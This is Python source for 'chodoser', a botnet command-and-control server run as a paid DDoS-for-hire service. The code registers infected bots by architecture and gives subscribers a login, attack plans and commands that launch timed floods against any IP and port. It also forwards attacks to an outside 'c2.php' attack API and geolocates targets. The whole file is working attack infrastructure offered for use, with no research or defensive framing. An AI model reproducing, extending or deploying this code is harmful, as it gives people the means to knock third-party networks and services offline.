import threading, socket, json, time, logging, os
from datetime import datetime
from colorama import Fore, init, Style
import ipaddress
import requests
from urllib.parse import urlparse, quote
from urllib.request import urlopen
import sys
import hashlib
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass
from enum import Enum


FIELDS = (
    "status,message,query,continent,continentCode,country,countryCode,"
    "regionName,city,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,"
    "reverse,mobile,proxy,hosting"
)

class AttackStatus(Enum):
    PENDING = "⏳"
    RUNNING = "⚡"
    COMPLETED = "✅"
    STOPPED = "🛑"
    FAILED = "❌"

@dataclass
class AttackInfo:
    id: int
    target: str
    port: str
    duration: str
    method: str
    thread_obj: threading.Thread
    stop_flag: bool = False
    start_time: float = None
    status: AttackStatus = AttackStatus.PENDING
    remaining: int = 0

def extract_host(target: str) -> str:
    t = target.strip()
    if not t:
        return ""
    parsed = urlparse(t if "://" in t else "//" + t, scheme="http")
    host = parsed.hostname or t
    return host.strip("[]")

def yn(v):
    return "✅" if v else "❌"

def utc_offset(seconds):
    try:
        h = int(seconds) // 3600
        sign = "+" if h >= 0 else "-"
        return f"UTC{sign}{abs(h)}"
    except Exception:
        return str(seconds)

def apiattack(ip, port, secs, method_name):
    url = f'https://api.domain.com/c2.php?host={ip}&port={port}&time={secs}&method={method_name}'
    try:
        response = requests.get(url, timeout=5)
        print(f"⚡ Attack API: {url}")

    except Exception as e:
        print(f"⚠️ Attack API error: {url} - {e}")


# Configurar logging
log_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'logs')
os.makedirs(log_dir, exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler(os.path.join(log_dir, f'chodoser_{datetime.now().strftime("%Y%m%d")}.log')),
        logging.StreamHandler()
    ]
)

# Integrações com módulos existentes
from src.config.config import configs
from src.database.database import login, get_user, update_user_attack_count, is_method_allowed
from src.methods.methods import botnetMethodsName, isBotnetMethod
from src.blacklist.blacklist import load_blacklist, is_blacklisted, add_to_blacklist, remove_from_blacklist
from src.plans.plans import format_plan_info
from src.commands.commands import handle_admin_commands

class chodoser:
    """🚀 Professional C2 Server - chodoser Enterprise Edition"""
    
    def __init__(self):
        """Initialize enterprise-grade C2 server"""
        logging.info("⚙️ Initializing chodoser C2 server...")
        self.config = configs()
        self.global_limits = self.config.get("global_limits", {})
        server_config = self.config.get("server", {})
        self.c2_name = "chodoser"  # Changed from Sentinela to chodoser
        self.host = server_config.get("host", "0.0.0.0")
        self.port = int(server_config.get("port", 6262))
        
        # Server state
        self.clients = {}
        self.attacks: Dict[str, List[AttackInfo]] = {}
        self.bots = {}
        
        # Bot categorization by architecture
        self.bots_by_arch = {
            "i386": [], "mips": [], "mips64": [], "x86_64": [],
            "armv7l": [], "armv8l": [], "aarch64": [], "ppc64le": [],
            "unknown": [],
        }
        
        # Constants
        self.ansi_clear = '\033[2J\033[H'
        
        # Professional Banner with gradient effect
        self.banner = f'''
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║     ░█████╗░██╗░░██╗░█████╗░██████╗░░█████╗░░██████╗███████╗██████╗░
║     ██╔══██╗██║░░██║██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔════╝██╔══██╗
║     ██║░░╚═╝███████║██║░░██║██║░░██║██║░░██║╚█████╗░█████╗░░██████╔╝
║     ██║░░██╗██╔══██║██║░░██║██║░░██║██║░░██║░╚═══██╗██╔══╝░░██╔══██╗
║     ╚█████╔╝██║░░██║╚█████╔╝██████╔╝╚█████╔╝██████╔╝███████╗██║░░██║
║     ░╚════╝░╚═╝░░╚═╝░╚════╝░╚═════╝░░╚════╝░╚═════╝░╚══════╝╚═╝░░╚═╝
║                                                              ║
║                    🚀 Enterprise C2 Server                    ║
║              Type 'help' for available commands              ║
╚══════════════════════════════════════════════════════════════╝
'''
        
        self.banner = self.colorize_text_gradient(self.banner)
        
        # Professional color scheme
        init(convert=True)
        self.colors = {
            "G": '\033[1;32m',  # Success Green
            "C": '\033[1;37m',  # Clean White
            "Y": '\033[1;33m',  # Warning Yellow
            "B": '\033[1;34m',  # Info Blue
            "R": '\033[1;31m',  # Error Red
            "Q": '\033[1;36m',  # Cyan
            "GRAY": '\033[90m',  # Gray
            "PURPLE": '\033[1;35m',  # Purple
            "RESET": '\033[0m',  # Reset
        }
    
    def colorize_text_gradient(self, banner):
        start_color = (147, 112, 219)  # Medium Purple
        end_color = (75, 0, 130)       # Indigo

        num_letters = len(banner)
        step_r = (end_color[0] - start_color[0]) / max(num_letters, 1)
        step_g = (end_color[1] - start_color[1]) / max(num_letters, 1)
        step_b = (end_color[2] - start_color[2]) / max(num_letters, 1)

        reset_color = "\033[0m"
        current_color = start_color
        colored_banner = ""

        for i, letter in enumerate(banner):
            color_code = f"\033[38;2;{int(current_color[0])};{int(current_color[1])};{int(current_color[2])}m"
            colored_banner += f"{color_code}{letter}{reset_color}"
            current_color = (current_color[0] + step_r, current_color[1] + step_g, current_color[2] + step_b)

        return colored_banner

    def start(self):
        """Start the C2 server with enterprise features"""
        logging.info(f"🚀 Starting chodoser C2 server on {self.host}:{self.port}")
        
        if int(self.port) < 1 or int(self.port) > 65535:
            logging.error("❌ Invalid port number")
            return False
        
        self.sock = socket.socket()
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            self.sock.bind((self.host, self.port))
        except Exception as e:
            logging.error(f"❌ Failed to bind to port: {e}")
            return False
            
        self.sock.listen()
        
        # Start background threads
        threading.Thread(target=self.ping_bots, daemon=True).start()
        threading.Thread(target=self.attack_monitor, daemon=True).start()
        
        logging.info(f"✅ chodoser C2 server is online!")
        print(f"\n{self.colors['G']}[+] {self.colors['Q']}chodoser{self.colors['G']} is online at {self.colors['Y']}{self.host}:{self.port}{self.colors['RESET']}\n")
        
        while True:
            try:
                client, address = self.sock.accept()
                threading.Thread(target=self.handle_client, args=(client, address)).start()
            except Exception as e:
                logging.error(f"❌ Connection error: {e}")
                
        return True
    
    def send(self, socket, data, escape=True, reset=True):
        """Send data to socket with proper formatting"""
        if reset:
            data += self.colors["RESET"]
        if escape:
            data += '\r\n'
        try:
            socket.send(data.encode())
        except:
            pass
    
    def attack_monitor(self):
        """Monitor and update attack statuses"""
        while True:
            for username, attacks in self.attacks.items():
                for attack in attacks:
                    if attack.start_time and attack.status == AttackStatus.RUNNING:
                        elapsed = time.time() - attack.start_time
                        attack.remaining = max(0, int(int(attack.duration) - elapsed))
                        if attack.remaining <= 0:
                            attack.status = AttackStatus.COMPLETED
            time.sleep(1)
    
    def handle_client(self, client, address):
        """Handle new client connection with enhanced UX"""
        try:
            self.send(client, f'\33]0;chodoser Enterprise | Secure Login\a', False)
            
            # Professional login screen
            self.send(client, self.ansi_clear, False)
            self.send(client, f'''
{self.colors["PURPLE"]}╔══════════════════════════════════════╗
║     🔐 chodoser Secure Login       ║
╚══════════════════════════════════════╝{self.colors["RESET"]}
''')
            
            # Username input
            while True:
                self.send(client, f'\n{self.colors["Q"]}┌─[{self.colors["G"]}Username{self.colors["Q"]}]', False)
                self.send(client, f'\n{self.colors["Q"]}└──╼ {self.colors["C"]}', False)
                username = client.recv(1024).decode().strip()
                if username:
                    break
            
            # Password input
            password = ''
            while True:
                self.send(client, f'\n{self.colors["Q"]}┌─[{self.colors["Y"]}Password{self.colors["Q"]}]', False)
                self.send(client, f'\n{self.colors["Q"]}└──╼ {self.colors["C"]}', False)
                while not password.strip():
                    password = client.recv(1024).decode('cp1252').strip()
                break
            
            # Bot connection detection
            if password == '\xff\xff\xff\xff\75\xff':
                self.register_bot(client, address, username)
                return
            
            # User login processing
            self.send(client, self.ansi_clear, False)
            
            if not login(username, password):
                self.send(client, f'''
{self.colors["R"]}╔══════════════════════════════════════╗
║      ❌ ACCESS DENIED              ║
╚══════════════════════════════════════╝{self.colors["RESET"]}
''')
                logging.warning(f"⚠️ Failed login attempt: {username} from {address[0]}")
                time.sleep(2)
                client.close()
                return
                
            logging.info(f"✅ User logged in: {username} from {address[0]}")
            self.clients[client] = address
            
            # Start client threads
            threading.Thread(target=self.update_title, args=(client, username), daemon=True).start()
            threading.Thread(target=self.command_line, args=(client, username), daemon=True).start()
            
        except Exception as e:
            logging.error(f"❌ Client handling error: {e}")
            client.close()
    
    def register_bot(self, client, address, arch):
        """Register a connected bot with enhanced tracking"""
        if arch not in self.bots_by_arch:
            arch = 'unknown'
            
        # Check for duplicate bot
        for bot_addr in self.bots.values():
            if bot_addr[0] == address[0]:
                client.close()
                return
                
        # Register bot
        self.bots[client] = address
        self.bots_by_arch[arch].append((client, address))
        logging.info(f"🤖 Bot connected: {address[0]} ({arch})")
    
    def remove_bot(self, client):
        """Remove bot from connected lists"""
        if client in self.bots:
            address = self.bots[client][0]
            arch_found = False
            
            for arch in self.bots_by_arch:
                for i, (bot_client, bot_addr) in enumerate(self.bots_by_arch[arch]):
                    if bot_client == client:
                        self.bots_by_arch[arch].pop(i)
                        arch_found = True
                        break
                if arch_found:
                    break
                    
            self.bots.pop(client)
            logging.info(f"🤖 Bot disconnected: {address}")
    
    def ping_bots(self):
        """Ping bots to check connectivity"""
        while True:
            dead_bots = []
            for bot in list(self.bots.keys()):
                try:
                    bot.settimeout(5)
                    self.send(bot, 'PING', False, False)
                    if bot.recv(1024).decode() != 'PONG':
                        dead_bots.append(bot)
                except Exception:
                    dead_bots.append(bot)
                    
            for bot in dead_bots:
                try:
                    bot.close()
                except:
                    pass
                self.remove_bot(bot)
                
            time.sleep(4)
    
    def update_title(self, client, username):
        """Update client terminal title with real-time info"""
        try:
            user_data = get_user(username)
            max_attacks = user_data.get('conn')
            max_time = user_data.get('maxtime')
            
            while True:
                current_user_attacks = len(self.attacks.get(username, []))
                
                title = f"\33]0;chodoser Enterprise | "
                title += f"User: {username} | "
                title += f"Plan: {user_data.get('plan')} | " 
                title += f"Time: 10-{max_time}s | "
                title += f"Active: {current_user_attacks}/{max_attacks} | "
                title += f"Expires: {user_data.get('expires_at')}\a"
                
                self.send(client, title, False)
                time.sleep(0.6)
        except Exception:
            client.close()
    
    def broadcast(self, data, username):
        """Broadcast command to all bots"""
        dead_bots = []
        threads = self.global_limits.get("threads")
        
        for bot in self.bots.keys():
            try:
                if len(data) > 5:
                    self.send(bot, f'{data} {threads} {username}', False, False)
                else:
                    self.send(bot, f'{data} {username}', False, False)
            except:
                dead_bots.append(bot)
                
        for bot in dead_bots:
            try:
                bot.close()
            except:
                pass
            self.remove_bot(bot)
    
    def list_arch_counts(self, client):
        """List bot counts by architecture with enhanced UI"""
        if not self.bots:
            self.send(client, f'{self.colors["Y"]}\n╔══════════════════════════════════════╗')
            self.send(client, f'║     No bots connected 📡           ║')
            self.send(client, f'╚══════════════════════════════════════╝\n')
            return
            
        self.send(client, f'{self.colors["Q"]}╔══════════════════════════════════════╗')
        self.send(client, f'║     Bot Statistics Summary        ║')
        self.send(client, f'╠══════════════════════════════════════╣')
        self.send(client, f'║ Total Bots: {self.colors["G"]}{len(self.bots):>18}{self.colors["Q"]} ║')
        self.send(client, f'╠══════════════════════════════════════╣')
        
        for arch, bot_list in self.bots_by_arch.items():
            if len(bot_list) > 0:
                arch_display = arch[:15] + "..." if len(arch) > 15 else arch
                self.send(client, f'║ {self.colors["C"]}{arch_display:<20}{self.colors["G"]}{len(bot_list):>6}{self.colors["Q"]} ║')
                
        self.send(client, f'╚══════════════════════════════════════╝\n')
    
    def validate_ip(self, ip):
        return True
        
    def validate_port(self, port, rand=False):
        """Validate port number"""
        if not port.isdigit():
            return False
            
        port_num = int(port)
        if rand:
            return 0 <= port_num <= 65535
        else:
            return 1 <= port_num <= 65535
    
    def validate_time(self, time, username):
        """Validate attack duration"""
        if not time.isdigit():
            return False
            
        time_num = int(time)
        
        user_data = get_user(username)
        max_time = int(user_data.get('maxtime'))
        min_time = self.global_limits.get("min_time", 10)
        return min_time <= time_num <= max_time
    
    def can_launch_attack(self, ip, port, secs, username, client):
        """Check if attack can be launched"""
        user_data = get_user(username)
        max_attacks = int(user_data.get('conn'))
        current_user_attacks = len(self.attacks.get(username, []))

        if is_blacklisted(ip):
            self.send(client, f'{self.colors["R"]}╔══════════════════════════════════════╗')
            self.send(client, f'║     ❌ Target is blacklisted!      ║')
            self.send(client, f'╚══════════════════════════════════════╝\n')
            return False
            
        if not self.validate_ip(ip):
            self.send(client, f'{self.colors["R"]}╔══════════════════════════════════════╗')
            self.send(client, f'║     ❌ Invalid IP address!         ║')
            self.send(client, f'╚══════════════════════════════════════╝\n')
            return False
            
        if not self.validate_port(port):
            self.send(client, f'{self.colors["R"]}╔══════════════════════════════════════╗')
            self.send(client, f'║     ❌ Invalid port number!        ║')
            self.send(client, f'╚══════════════════════════════════════╝\n')
            return False
            
        if not self.validate_time(secs, username):
            min_time = self.global_limits.get("min_time", 10)
            user_data = get_user(username)
            max_time = int(user_data.get('maxtime'))
            self.send(client, f'{self.colors["R"]}╔══════════════════════════════════════╗')
            self.send(client, f'║     ❌ Invalid duration!           ║')
            self.send(client, f'║     Min: {min_time}s Max: {max_time}s        ║')
            self.send(client, f'╚══════════════════════════════════════╝\n')
            return False
            
        if current_user_attacks >= max_attacks:
            self.send(client, f'{self.colors["R"]}╔══════════════════════════════════════╗')
            self.send(client, f'║     ❌ No attack slots available!  ║')
            self.send(client, f'║     Active: {current_user_attacks}/{max_attacks}              ║')
            self.send(client, f'╚══════════════════════════════════════╝\n')
            return False
            
        return True
    
    def remove_attack(self, username, attack_id):
        """Remove an attack after timeout"""
        if username in self.attacks:
            initial_count = len(self.attacks[username])
            self.attacks[username] = [attack for attack in self.attacks[username] if attack.id != attack_id]
            if len(self.attacks[username]) < initial_count:
                logging.info(f"✅ Attack {attack_id} completed for {username}")
            if not self.attacks[username]:
                del self.attacks[username]
    
    def return_banner(self, client, username, user_data):
        """Display professional banner"""
        for line in self.banner.split('\n'):
            self.send(client, line)
        
        # Show quick stats
        active_attacks = len(self.attacks.get(username, []))
        max_attacks = user_data.get('conn')
        
        self.send(client, f'''
{self.colors["GRAY"]}═══════════════════════════════════════════════════════════════
{self.colors["Q"]}📍 User: {self.colors["G"]}{username:<15} {self.colors["Q"]}📊 Plan: {self.colors["Y"]}{user_data.get("plan"):<10} {self.colors["Q"]}⚡ Active: {self.colors["G"]}{active_attacks}/{max_attacks}
{self.colors["GRAY"]}═══════════════════════════════════════════════════════════════{self.colors["RESET"]}
''')
        return

    def command_line(self, client, username):
        """Enhanced command line interface"""
        user_data = get_user(username)
        
        self.return_banner(client, username, user_data)
        
        # Professional prompt
        prompt = f'{self.colors["Q"]}┌─[{self.colors["G"]}chodoser{self.colors["Q"]}@{self.colors["Y"]}{username}{self.colors["Q"]}]\n└──╼ {self.colors["C"]}> {self.colors["RESET"]}'
        self.send(client, prompt, False)
        
        try:
            while True:
                data = client.recv(1024).decode().strip()
                if not data:
                    continue
                    
                args = data.split(' ')
                command = args[0].upper()
                
                # Clear screen and show banner
                self.send(client, self.ansi_clear, False)
                for line in self.banner.split('\n'):
                    self.send(client, line)
                
                # Admin commands
                if command.startswith('!'):
                    handle_admin_commands(command, args, client, self.send, username)
                    self.send(client, prompt, False)
                    continue
                    
                # Regular commands
                if command in ['HELP', '?', 'COMMANDS']:
                    self.send(client, f'''
{self.colors["Q"]}╔═══════════════════════════════════════════════════════════════╗
║                     AVAILABLE COMMANDS                        ║
╠═══════════════════════════════════════════════════════════════╣
║ {self.colors["G"]}HELP    {self.colors["C"]}→ Show this help menu                          {self.colors["Q"]}║
║ {self.colors["G"]}METHODS {self.colors["C"]}→ List all attack methods                     {self.colors["Q"]}║
║ {self.colors["G"]}STATS   {self.colors["C"]}→ Show attack statistics                      {self.colors["Q"]}║
║ {self.colors["G"]}CLEAR   {self.colors["C"]}→ Clear the screen                           {self.colors["Q"]}║
║ {self.colors["G"]}CONTACT {self.colors["C"]}→ Show contact information                    {self.colors["Q"]}║
║ {self.colors["G"]}LOGOUT  {self.colors["C"]}→ Disconnect from server                      {self.colors["Q"]}║
║ {self.colors["G"]}STOPALL {self.colors["C"]}→ Stop all running attacks                    {self.colors["Q"]}║
╚═══════════════════════════════════════════════════════════════╝
''')
                    
                elif command == 'STATS':
                    active = len(self.attacks.get(username, []))
                    total_bots = len(self.bots)
                    
                    self.send(client, f'''
{self.colors["Q"]}╔═══════════════════════════════════════════════════════════════╗
║                     ATTACK STATISTICS                          ║
╠═══════════════════════════════════════════════════════════════╣
║ {self.colors["C"]}Active Attacks: {self.colors["G"]}{active:<10}{self.colors["C"]} Total Bots: {self.colors["G"]}{total_bots:<10}{self.colors["Q"]}║
╚═══════════════════════════════════════════════════════════════╝
''')
                    
                elif command == 'METHODS':
                    botnetMethods = botnetMethodsName('ALL')
                    self.send(client, f'''
{self.colors["Q"]}╔═══════════════════════════════════════════════════════════════╗
║                     ATTACK METHODS                             ║
╠═══════════════════════════════════════════════════════════════╣''')
                    
                    user_data = get_user(username)
                    user_plan = user_data.get('plan', 'basic') if user_data else 'basic'
                    
                    for method, desc in botnetMethods.items():
                        method_name = method[1:] if method.startswith('.') else method
                        method_available = is_method_allowed(username, method_name)
                        
                        status = f"{self.colors['G']}✓" if method_available else f"{self.colors['R']}✗"
                        self.send(client, f'║ {status}{self.colors["Q"]} {method:<12} {self.colors["C"]}→ {desc:<45}{self.colors["Q"]} ║')
                    
                    self.send(client, f'╚═══════════════════════════════════════════════════════════════╝\n')
                    
                elif command == 'STOPALL':
                    if username in self.attacks and self.attacks[username]:
                        for attack in list(self.attacks[username]):
                            self.broadcast(f"STOP {attack.target} {attack.port} {attack.method}", username)
                            attack.stop_flag = True
                            attack.status = AttackStatus.STOPPED
                        
                        self.attacks[username].clear()
                        del self.attacks[username]
                        self.send(client, f'''
{self.colors["G"]}╔══════════════════════════════════════╗
║     ✅ All attacks stopped!           ║
╚══════════════════════════════════════╝
''')
                        logging.info(f"All attacks for {username} stopped manually")
                    else:
                        self.send(client, f'''
{self.colors["Y"]}╔══════════════════════════════════════╗
║     No active attacks found          ║
╚══════════════════════════════════════╝
''')
                        
                elif command in ['CONTACT', 'CREDITS']:
                    self.send(client, f'''
{self.colors["Q"]}╔══════════════════════════════════════╗
║     CONTACT INFORMATION              ║
╠══════════════════════════════════════╣
║ {self.colors["C"]}Telegram: {self.colors["G"]}@chodoser_support    {self.colors["Q"]}║
║ {self.colors["C"]}Email:    {self.colors["G"]}support@chodoser.io  {self.colors["Q"]}║
║ {self.colors["C"]}Website:  {self.colors["G"]}chodoser.io          {self.colors["Q"]}║
╚══════════════════════════════════════╝
''')
                    
                elif command in ['CLEAR', 'CLS']:
                    self.send(client, self.ansi_clear, False)
                    self.return_banner(client, username, user_data)
                        
                elif command in ['LOGOUT', 'QUIT', 'EXIT', 'BYE']:
                    self.send(client, f'''
{self.colors["Y"]}╔══════════════════════════════════════╗
║     👋 Goodbye, {username:<12}   ║
╚══════════════════════════════════════╝
''')
                    time.sleep(1)
                    break
                    
                elif isBotnetMethod(command):
                    method_name = command[1:] if command.startswith('.') else command
                    if not is_method_allowed(username, method_name):
                        self.send(client, f'''
{self.colors["R"]}╔══════════════════════════════════════╗
║     ❌ Method not available!         ║
║     Upgrade your plan to use this    ║
╚══════════════════════════════════════╝
''')
                        self.send(client, prompt, False)
                        continue
                        
                    if len(args) == 4:
                        ip = args[1]
                        port = args[2]
                        secs = args[3]
                        
                        host = extract_host(ip)
                        if not host:
                            print("Cannot parse host from input.")
                            return
                        
                        # Get target info
                        url = f"http://ip-api.com/json/{quote(host, safe=':')}?fields={FIELDS}&lang=en"
                        try:
                            with urlopen(url, timeout=10) as resp:
                                data = json.loads(resp.read().decode("utf-8", errors="ignore"))
                        except:
                            data = {"status": "fail", "query": host}
                        
                        if self.can_launch_attack(ip, port, secs, username, client):
                            # Professional attack launch UI
                            attack_info = f'''
{self.colors["Q"]}╔═══════════════════════════════════════════════════════════════╗
║                     ATTACK LAUNCHED!                            ║
╠═══════════════════════════════════════════════════════════════╣
║ {self.colors["C"]}Method:    {self.colors["G"]}{botnetMethodsName(command).strip():<40}{self.colors["Q"]} ║
║ {self.colors["C"]}Target:    {self.colors["G"]}{ip:<40}{self.colors["Q"]} ║
║ {self.colors["C"]}Port:      {self.colors["G"]}{port:<40}{self.colors["Q"]} ║
║ {self.colors["C"]}Duration:  {self.colors["G"]}{secs} seconds{self.colors["Q"]}                                     ║
╠═══════════════════════════════════════════════════════════════╣'''
                            
                            for line in attack_info.split('\n'):
                                self.send(client, line)
                            
                            if data.get("status") == "success":
                                target_info = f'''
║ {self.colors["C"]}Location:  {self.colors["G"]}{data.get('country', 'Unknown')} ({data.get('countryCode', 'N/A')}){self.colors["Q"]}                 ║
║ {self.colors["C"]}ISP:       {self.colors["G"]}{data.get('isp', 'Unknown')[:35]:<35}{self.colors["Q"]} ║
║ {self.colors["C"]}ASN:       {self.colors["G"]}{data.get('as', 'Unknown')[:35]:<35}{self.colors["Q"]} ║'''
                                for line in target_info.split('\n'):
                                    self.send(client, line)
                            
                            self.send(client, f'╚═══════════════════════════════════════════════════════════════╝\n')
                            
                            # Broadcast attack
                            self.broadcast(data, username)
                            
                            # Create attack record
                            attack_id = int(time.time() * 1000)
                            
                            if username not in self.attacks:
                                self.attacks[username] = []
                            
                            attack_thread = threading.Thread(target=self._attack_timer, args=(username, attack_id, int(secs)))
                            attack_thread.daemon = True
                            attack_thread.start()

                            attack_info_obj = AttackInfo(
                                id=attack_id,
                                target=ip,
                                port=port,
                                duration=secs,
                                method=command,
                                thread_obj=attack_thread,
                                start_time=time.time(),
                                status=AttackStatus.RUNNING,
                                remaining=int(secs)
                            )
                            
                            self.attacks[username].append(attack_info_obj)
                            update_user_attack_count(username)
                            
                            # API call in background
                            threading.Thread(target=apiattack, args=(ip, port, secs, method_name)).start()
                            
                            logging.info(f"⚡ Attack launched: {username} => {ip}:{port} ({command}) for {secs}s")
                    else:
                        self.send(client, f'''
{self.colors["Y"]}╔══════════════════════════════════════╗
║     Usage: {command} [IP] [PORT] [TIME]   ║
╚══════════════════════════════════════╝
''')
                else:
                    self.send(client, f'''
{self.colors["R"]}╔══════════════════════════════════════╗
║     ❌ Command not found!             ║
║     Type 'HELP' for available commands║
╚══════════════════════════════════════╝
''')
                
                self.send(client, prompt, False)
                
        except Exception as e:
            logging.error(f"❌ Command line error: {e}")
        finally:
            # Cleanup on disconnect
            if username in self.attacks:
                for attack in list(self.attacks[username]):
                    attack.stop_flag = True
                del self.attacks[username]
            
            client.close()
            if client in self.clients:
                del self.clients[client]
            logging.info(f"👋 User disconnected: {username}")

    def _attack_timer(self, username, attack_id, timeout):
        """Attack timer helper with status updates"""
        start_time = time.time()
        while time.time() - start_time < timeout:
            if username in self.attacks:
                current_attack = next((a for a in self.attacks[username] if a.id == attack_id), None)
                if current_attack and current_attack.stop_flag:
                    logging.info(f"🛑 Attack {attack_id} for {username} stopped by flag")
                    current_attack.status = AttackStatus.STOPPED
                    break
                if current_attack:
                    remaining = int(timeout - (time.time() - start_time))
                    current_attack.remaining = remaining
            time.sleep(1)
        
        if username in self.attacks:
            current_attack = next((a for a in self.attacks[username] if a.id == attack_id), None)
            if current_attack and not current_attack.stop_flag:
                current_attack.status = AttackStatus.COMPLETED
        
        self.remove_attack(username, attack_id)

# Main entry point
def main():
    """chodoser C2 Server - Main Entry Point"""
    print(f'''
{Fore.MAGENTA}╔═══════════════════════════════════════════════════════════════╗
║                                                                   ║
║     ░█████╗░██╗░░██╗░█████╗░██████╗░░█████╗░░██████╗███████╗██████╗░
║     ██╔══██╗██║░░██║██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔════╝██╔══██╗
║     ██║░░╚═╝███████║██║░░██║██║░░██║██║░░██║╚█████╗░█████╗░░██████╔╝
║     ██║░░██╗██╔══██║██║░░██║██║░░██║██║░░██║░╚═══██╗██╔══╝░░██╔══██╗
║     ╚█████╔╝██║░░██║╚█████╔╝██████╔╝╚█████╔╝██████╔╝███████╗██║░░██║
║     ░╚════╝░╚═╝░░╚═╝░╚════╝░╚═════╝░░╚════╝░╚═════╝░╚══════╝╚═╝░░╚═╝
║                                                                   ║
║                    🚀 ENTERPRISE C2 SERVER v2.0                    ║
║                                                                   ║
╠═══════════════════════════════════════════════════════════════╣
║ {Fore.CYAN}Starting chodoser C2 server...{Fore.MAGENTA}                              ║
╚═══════════════════════════════════════════════════════════════╝{Fore.RESET}
''')
    
    server = chodoser()
    server.start()

if __name__ == '__main__':
    main()